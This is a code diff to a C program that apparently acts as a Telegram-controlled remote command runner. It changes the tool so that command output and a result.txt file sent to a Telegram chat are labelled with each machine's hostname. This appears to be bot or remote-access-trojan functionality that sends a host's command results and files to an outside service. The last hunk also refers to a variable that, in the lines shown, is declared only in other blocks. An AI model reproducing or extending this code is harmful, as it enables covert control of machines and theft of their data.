@@ -164,8 +164,10 @@ int main(int argc , char *argv[])
                         strcpy(buf, "No output");
                     }
 
-                    printf("Null\n");
-                    sprintf(msg, "```\n%s\n```", buf);
+                    char hostname[2000];
+                    getHostname(hostname);
+
+                    sprintf(msg, "Result from `%s`\n```\n%s\n```", hostname, buf);
                     telegram_send_act(chat_id, "typing");
                     telegram_send_msg(chat_id, msg);
                     printf("%s\n", buf);
@@ -183,7 +185,10 @@ int main(int argc , char *argv[])
                     }
                     fclose(exe_file);
 
-                    sprintf(msg, "```\n%s\n```", buf);
+                    char hostname[2000];
+                    getHostname(hostname);
+
+                    sprintf(msg, "Result from `%s`\n```\n%s\n```", hostname, buf);
                     telegram_send_act(chat_id, "typing");
                     telegram_send_msg(chat_id, msg);
                     printf("%s\n", buf);
@@ -193,6 +198,9 @@ int main(int argc , char *argv[])
                 else{
                     //sending_exe.log
                     telegram_send_act(chat_id, "upload_document");
+
+                    sprintf(msg, "Result from `%s`", hostname);
+                    telegram_send_msg(chat_id, msg);
                     telegram_send_file(chat_id, "result.txt");
                     printf("send result.txt\n");
                 }
